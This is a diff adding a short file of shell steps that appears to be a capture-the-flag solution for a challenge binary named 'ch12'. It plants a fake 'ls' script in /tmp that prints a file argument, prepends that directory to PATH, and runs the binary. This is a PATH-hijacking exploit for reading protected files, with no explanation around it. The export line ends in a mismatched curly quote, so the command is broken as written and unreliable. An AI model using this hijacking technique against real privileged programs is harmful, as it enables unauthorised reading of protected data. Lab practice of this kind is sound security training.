@@ -1,0 +1,13 @@
+cd tmp
+mkdir lol
+cd lol
+vim ls
+[
+#!/bin/sh
+
+cat $2
+]
+chmod +x ls
+export PATH="/tmp/lol/:$PATH”
+cd
+./ch12
